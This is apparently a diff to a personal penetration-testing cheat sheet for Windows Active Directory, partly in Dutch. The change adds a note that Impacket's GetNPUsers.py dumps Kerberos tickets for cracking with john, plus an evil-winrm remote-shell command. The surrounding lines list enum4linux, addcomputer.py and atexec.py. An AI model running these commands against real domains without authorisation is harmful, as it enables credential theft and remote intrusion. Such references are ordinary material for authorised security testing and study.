@@ -19,7 +19,8 @@ enum4linux -a example.com
 -Do an nmblookup (Similar to nbtstat)
 -Get printer infromation
 
-python GetNPUsers.py domain/user -no-pass
+python GetNPUsers.py domain/user -no-pass = DUMPT TGTs van Kerberos... cracken met john.
+evil-winrm-rb -i IP-aders -u username -p password
 
 addcomputer.py domain/username:password
 atexec.py domain/username:password@example.com <Command>
